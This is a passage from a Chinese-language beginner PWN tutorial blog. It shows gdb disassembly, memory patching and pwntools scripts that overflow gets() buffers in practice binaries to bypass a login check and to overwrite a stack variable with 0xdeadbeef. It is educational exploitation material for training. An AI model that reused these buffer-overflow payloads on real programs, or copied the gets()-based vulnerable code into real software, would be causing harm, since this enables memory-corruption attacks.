class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08049192 &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x08049196 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x08049199 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0804919c &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0804919d &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804919f &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x080491a0 &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x080491a1 &lt;+15&gt;:	sub    esp,0x10</span><br><span class="line">   0x080491a4 &lt;+18&gt;:	call   0x80490d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x080491a9 &lt;+23&gt;:	add    ebx,0x2e57</span><br><span class="line">   0x080491af &lt;+29&gt;:	mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x080491b6 &lt;+36&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491b9 &lt;+39&gt;:	lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x080491bf &lt;+45&gt;:	push   eax</span><br><span class="line">   0x080491c0 &lt;+46&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x080491c5 &lt;+51&gt;:	add    esp,0x10</span><br><span class="line">   0x080491c8 &lt;+54&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491cb &lt;+57&gt;:	lea    eax,[ebp-0x12]</span><br><span class="line">   0x080491ce &lt;+60&gt;:	push   eax</span><br><span class="line">   0x080491cf &lt;+61&gt;:	call   0x8049050 &lt;gets@plt&gt;</span><br><span class="line">   0x080491d4 &lt;+66&gt;:	add    esp,0x10</span><br><span class="line">   0x080491d7 &lt;+69&gt;:	sub    esp,0x8</span><br><span class="line">   0x080491da &lt;+72&gt;:	lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x080491e0 &lt;+78&gt;:	push   eax</span><br><span class="line">   0x080491e1 &lt;+79&gt;:	lea    eax,[ebp-0x12]</span><br><span class="line">   0x080491e4 &lt;+82&gt;:	push   eax</span><br><span class="line">   0x080491e5 &lt;+83&gt;:	call   0x8049030 &lt;strcmp@plt&gt;</span><br><span class="line">   0x080491ea &lt;+88&gt;:	add    esp,0x10</span><br><span class="line">   0x080491ed &lt;+91&gt;:	test   eax,eax</span><br><span class="line">   0x080491ef &lt;+93&gt;:	jne    0x804920c &lt;main+122&gt;</span><br><span class="line">   0x080491f1 &lt;+95&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491f4 &lt;+98&gt;:	lea    eax,[ebx-0x1fdc]</span><br><span class="line">   0x080491fa &lt;+104&gt;:	push   eax</span><br><span class="line">   0x080491fb &lt;+105&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x08049200 &lt;+110&gt;:	add    esp,0x10</span><br><span class="line">   0x08049203 &lt;+113&gt;:	mov    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">   0x0804920a &lt;+120&gt;:	jmp    0x804921e &lt;main+140&gt;</span><br><span class="line">   0x0804920c &lt;+122&gt;:	sub    esp,0xc</span><br><span class="line">   0x0804920f &lt;+125&gt;:	lea    eax,[ebx-0x1fca]</span><br><span class="line">   0x08049215 &lt;+131&gt;:	push   eax</span><br><span class="line">   0x08049216 &lt;+132&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x0804921b &lt;+137&gt;:	add    esp,0x10</span><br><span class="line">   0x0804921e &lt;+140&gt;:	cmp    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x08049222 &lt;+144&gt;:	je     0x804923b &lt;main+169&gt;</span><br><span class="line">   0x08049224 &lt;+146&gt;:	sub    esp,0x8</span><br><span class="line">   0x08049227 &lt;+149&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804922a &lt;+152&gt;:	lea    eax,[ebx-0x1fb4]</span><br><span class="line">   0x08049230 &lt;+158&gt;:	push   eax</span><br><span class="line">   0x08049231 &lt;+159&gt;:	call   0x8049040 &lt;printf@plt&gt;</span><br><span class="line">   0x08049236 &lt;+164&gt;:	add    esp,0x10</span><br><span class="line">   0x08049239 &lt;+167&gt;:	jmp    0x8049250 &lt;main+190&gt;</span><br><span class="line">   0x0804923b &lt;+169&gt;:	sub    esp,0x8</span><br><span class="line">   0x0804923e &lt;+172&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08049241 &lt;+175&gt;:	lea    eax,[ebx-0x1f80]</span><br><span class="line">   0x08049247 &lt;+181&gt;:	push   eax</span><br><span class="line">   0x08049248 &lt;+182&gt;:	call   0x8049040 &lt;printf@plt&gt;</span><br><span class="line">   0x0804924d &lt;+187&gt;:	add    esp,0x10</span><br><span class="line">   0x08049250 &lt;+190&gt;:	mov    eax,0x0</span><br><span class="line">   0x08049255 &lt;+195&gt;:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x08049258 &lt;+198&gt;:	pop    ecx</span><br><span class="line">   0x08049259 &lt;+199&gt;:	pop    ebx</span><br><span class="line">   0x0804925a &lt;+200&gt;:	pop    ebp</span><br><span class="line">   0x0804925b &lt;+201&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x0804925e &lt;+204&gt;:	ret</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>注意到：</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804921e &lt;+140&gt;:	cmp    DWORD PTR [ebp-0xc],0x0</span><br></pre></td></tr></table></figure></div><ul><li>在这个对比指令的地址下一个断点，查看程序对比的流程</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x0804921e</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div><ul><li>运行后结果：</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→  0x804921e &lt;main+008c&gt;      cmp    DWORD PTR [ebp-0xc], 0x0</span><br></pre></td></tr></table></figure></div><ul><li><p>这里将<code>ebp</code>寄存器里的值减去了<code>0xc</code>转换成10进制，就是12和0做了对比</p></li><li><p>查看这个地址的值</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x $ebp - 0xc</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x $ebp - 0xc</span><br><span class="line">0xffffcaac:	0x00000000</span><br></pre></td></tr></table></figure></div><ul><li>修改这里的值，使程序不进行跳转</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *0xffffcaac = 1</span><br></pre></td></tr></table></figure></div><ul><li>输入<code>r</code>重新运行程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r</span><br></pre></td></tr></table></figure></div><ul><li>查看对比值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp - 0xc</span><br><span class="line">0xffffcaac:	0x00000041</span><br></pre></td></tr></table></figure></div><ul><li>写一个脚本</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z = &quot;AAAAAAA&quot;</span><br><span class="line">print(z + &quot;\x01&quot;)</span><br></pre></td></tr></table></figure></div><ul><li>保存后用<code>python3</code>运行</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py | ./login</span><br></pre></td></tr></table></figure></div><ul><li>运行结果</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim exp.py              </span><br><span class="line">python3 exp.py | ./login</span><br><span class="line"></span><br><span class="line">Enter admin password: </span><br><span class="line">Incorrect Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1) :)</span><br></pre></td></tr></table></figure></div><h4 id="第一个pwntools脚本"><a class="header-anchor" href="#第一个pwntools脚本">¶</a>第一个pwntools脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   //导入pwntools模块</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./login&#x27;</span>)   //运行程序</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;AAAAAA&#x27;</span>+<span class="string">b&quot;\x01&quot;</span>)   //在程序输出<span class="string">&quot;：&quot;</span>后发送指定字符</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall().decode())   //接收输出并且解码</span><br></pre></td></tr></table></figure></div><hr><h1>240924</h1><p><a class="link" target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126770702?spm=1001.2014.3001.5502">PWN入门（3）覆盖堆栈上的变量_栈怎么覆盖一个变量使它等于2000-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><hr><h2 id="覆盖堆栈上的变量"><a class="header-anchor" href="#覆盖堆栈上的变量">¶</a>覆盖堆栈上的变量</h2><h3 id="静态调试-v2"><a class="header-anchor" href="#静态调试-v2">¶</a>静态调试</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_input</span><span class="params">()</span>&#123;   </span><br><span class="line">    <span class="type">int</span> key = <span class="number">0x12345678</span>;   <span class="comment">//定义了一个变量key，key的值为0x12345678</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">32</span>];    <span class="comment">//定义了一个变量，名为buffer，有32个字节的缓冲区</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes? &quot;</span>);    <span class="comment">//输出字符串yes?</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);   <span class="comment">//清除缓冲区</span></span><br><span class="line">    gets(buffer);   <span class="comment">//获取我们输入的字符，并存入到buffer变量里</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xdeadbeef</span>)&#123;    <span class="comment">//如果key = 0xdeadbeef</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job!!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%04x\n&quot;</span>, key);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);    <span class="comment">//成功破解程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;   <span class="comment">//否则失败</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%04x\n&quot;</span>, key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;...\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    do_input();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  python3 -c &#x27;print (&quot;A&quot;*32)&#x27;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">(pwn) ➜  02-overwriting_stack_variables_part2 git:(master) ✗ unhex 42424242</span><br><span class="line">BBBB%                                                      </span><br></pre></td></tr></table></figure></div><ul><li><p><code>'print (&quot;A&quot;*32)'</code> 是要执行的 Python 代码，它创建了一个由 32 个 “A” 字符组成的字符串，并将其打印出来</p><ul><li><code>-c</code> 参数告诉 Python 解释器直接从命令行参数中读取并执行一段代码</li></ul></li><li><p><code>unhex</code>：将一个十六进制数转换为对应的 ASCII 字符或其他表示形式</p></li><li><p>由源代码可知，<code>key</code>的值必须等于十六进制的<code>0xdeadbeef</code>才能输出正确的字符，这种十六进制无法用键盘输入，需要用到<code>python</code></p></li><li><p>一个知识点：在<code>x86</code>架构里，<strong>读取地址是由低到高的</strong>，十六进制<code>0xdeadbeef</code>就要从最后一个开始写</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print (&#x27;A&#x27; * 32 + &#x27;\xef\xbe\xad\xde&#x27;)&quot;</span><br></pre></td></tr></table></figure></div><ul><li>然后用linux管道符连接程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print (&#x27;A&#x27; * 32 + &#x27;\xef\xbe\xad\xde&#x27;)&quot; | ./overwrite</span><br></pre></td></tr></table></figure></div><h3 id="动态调试-v2"><a class="header-anchor" href="#动态调试-v2">¶</a>动态调试</h3><ul><li>用gdb</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb overwrite</span><br></pre></td></tr></table></figure></div><ul><li>查看程序里调用的函数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line"></span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  printf@plt</span><br><span class="line">0x08049040  fflush@plt</span><br><span class="line">0x08049050  gets@plt</span><br><span class="line">0x08049060  puts@plt</span><br><span class="line">0x08049070  __libc_start_main@plt</span><br><span class="line">0x08049080  _start</span><br><span class="line">0x080490c0  _dl_relocate_static_pie</span><br><span class="line">0x080490d0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490e0  deregister_tm_clones</span><br><span class="line">0x08049120  register_tm_clones</span><br><span class="line">0x08049160  __do_global_dtors_aux</span><br><span class="line">0x08049190  frame_dummy</span><br><span class="line">0x08049192  do_input</span><br><span class="line">0x08049267  main</span><br><span class="line">0x08049283  __x86.get_pc_thunk.ax</span><br><span class="line">0x08049290  __libc_csu_init</span><br><span class="line">0x080492f0  __libc_csu_fini</span><br><span class="line">0x080492f1  __x86.get_pc_thunk.bp</span><br><span class="line">0x080492f8  _fini</span><br></pre></td></tr></table></figure></div><ul><li>查看主函数do_input的汇编代码</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble do_input </span><br><span class="line"></span><br><span class="line">Dump of assembler code for function do_input:</span><br><span class="line">   0x08049192 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08049193 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08049195 &lt;+3&gt;:	push   ebx</span><br><span class="line">   0x08049196 &lt;+4&gt;:	sub    esp,0x34</span><br><span class="line">   0x08049199 &lt;+7&gt;:	call   0x80490d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x0804919e &lt;+12&gt;:	add    ebx,0x2e62</span><br><span class="line">   0x080491a4 &lt;+18&gt;:	mov    DWORD PTR [ebp-0xc],0x12345678</span><br><span class="line">   0x080491ab &lt;+25&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491ae &lt;+28&gt;:	lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x080491b4 &lt;+34&gt;:	push   eax</span><br><span class="line">   0x080491b5 &lt;+35&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x080491ba &lt;+40&gt;:	add    esp,0x10</span><br><span class="line">   0x080491bd &lt;+43&gt;:	mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x080491c3 &lt;+49&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x080491c5 &lt;+51&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491c8 &lt;+54&gt;:	push   eax</span><br><span class="line">   0x080491c9 &lt;+55&gt;:	call   0x8049040 &lt;fflush@plt&gt;</span><br><span class="line">   0x080491ce &lt;+60&gt;:	add    esp,0x10</span><br><span class="line">   0x080491d1 &lt;+63&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491d4 &lt;+66&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x080491d7 &lt;+69&gt;:	push   eax</span><br><span class="line">   0x080491d8 &lt;+70&gt;:	call   0x8049050 &lt;gets@plt&gt;</span><br><span class="line">   0x080491dd &lt;+75&gt;:	add    esp,0x10</span><br><span class="line">   0x080491e0 &lt;+78&gt;:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef</span><br><span class="line">   0x080491e7 &lt;+85&gt;:	jne    0x8049226 &lt;do_input+148&gt;</span><br><span class="line">   0x080491e9 &lt;+87&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491ec &lt;+90&gt;:	lea    eax,[ebx-0x1ff2]</span><br><span class="line">   0x080491f2 &lt;+96&gt;:	push   eax</span><br><span class="line">   0x080491f3 &lt;+97&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x080491f8 &lt;+102&gt;:	add    esp,0x10</span><br><span class="line">   0x080491fb &lt;+105&gt;:	sub    esp,0x8</span><br><span class="line">   0x080491fe &lt;+108&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08049201 &lt;+111&gt;:	lea    eax,[ebx-0x1fe7]</span><br><span class="line">   0x08049207 &lt;+117&gt;:	push   eax</span><br><span class="line">   0x08049208 &lt;+118&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x0804920d &lt;+123&gt;:	add    esp,0x10</span><br><span class="line">   0x08049210 &lt;+126&gt;:	mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x08049216 &lt;+132&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08049218 &lt;+134&gt;:	sub    esp,0xc</span><br><span class="line">   0x0804921b &lt;+137&gt;:	push   eax</span><br><span class="line">   0x0804921c &lt;+138&gt;:	call   0x8049040 &lt;fflush@plt&gt;</span><br><span class="line">   0x08049221 &lt;+143&gt;:	add    esp,0x10</span><br><span class="line">   0x08049224 &lt;+146&gt;:	jmp    0x8049261 &lt;do_input+207&gt;</span><br><span class="line">   0x08049226 &lt;+148&gt;:	sub    esp,0x8</span><br><span class="line">   0x08049229 &lt;+151&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804922c &lt;+154&gt;:	lea    eax,[ebx-0x1fe7]</span><br><span class="line">   0x08049232 &lt;+160&gt;:	push   eax</span><br><span class="line">   0x08049233 &lt;+161&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x08049238 &lt;+166&gt;:	add    esp,0x10</span><br><span class="line">   0x0804923b &lt;+169&gt;:	sub    esp,0xc</span><br><span class="line">   0x0804923e &lt;+172&gt;:	lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x08049244 &lt;+178&gt;:	push   eax</span><br><span class="line">   0x08049245 &lt;+179&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x0804924a &lt;+184&gt;:	add    esp,0x10</span><br><span class="line">   0x0804924d &lt;+187&gt;:	mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x08049253 &lt;+193&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08049255 &lt;+195&gt;:	sub    esp,0xc</span><br><span class="line">   0x08049258 &lt;+198&gt;:	push   eax</span><br><span class="line">   0x08049259 &lt;+199&gt;:	call   0x8049040 &lt;fflush@plt&gt;</span><br><span class="line">   0x0804925e &lt;+204&gt;:	add    esp,0x10</span><br><span class="line">   0x08049261 &lt;+207&gt;:	nop</span><br><span class="line">   0x08049262 &lt;+208&gt;:	mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049265 &lt;+211&gt;:	leave</span><br><span class="line">   0x08049266 &lt;+212&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><ul><li>此处key的值和输入值做对比</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080491e0 &lt;+78&gt;:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef</span><br></pre></td></tr></table></figure></div><ul><li>下一个断点</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0x080491e0</span><br></pre></td></tr></table></figure></div><ul><li>启动程序，输入一些值，然后程序自动运行至断点处停下</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80491e0 &lt;do_input+004e&gt;  cmp    DWORD PTR [ebp-0xc], 0xdeadbeef</span><br></pre></td></tr></table></figure></div><ul><li><p>这里将<code>ebp</code>寄存器里的值减去了<code>0xc</code>转换成<code>10</code>进制，就是<code>12</code>和<code>0xdeadbeef</code>做了对比</p></li><li><p>查看这个地址的值</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp - 0xc</span><br><span class="line"></span><br><span class="line">0xffffca9c:	0x12345678</span><br></pre></td></tr></table></figure></div><ul><li>直接修改这个地址的值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *0xffffca9c = 0xdeadbeef</span><br></pre></td></tr></table></figure></div><ul><li>再次查看这个地址的值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  set *0xffffca9c = 0xdeadbeef</span><br><span class="line">gef➤  x $ebp - 0xc</span><br><span class="line">0xffffca9c:	0xdeadbeef</span><br></pre></td></tr></table></figure></div><ul><li>输入<code>n</code>继续执行程序，直到运行到<code>call</code>，成功运行程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts@plt (</span><br><span class="line">   [sp + 0x0] = 0x0804a00e → &quot;good job!!&quot;,</span><br><span class="line">   [sp + 0x4] = 0x00000018</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><h4 id="pwntools脚本"><a class="header-anchor" href="#pwntools脚本">¶</a>pwntools脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   //导入pwntools模块</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./overwrite&#x27;</span>)    //运行程序</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + p32(<span class="number">0xdeadbeef</span>))   //程序运行后发送指定的字符串，格式为<span class="number">32</span>位</span><br><span class="line"><span class="built_in">print</span>(io.recvall().decode())   //接收输出并且解码</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 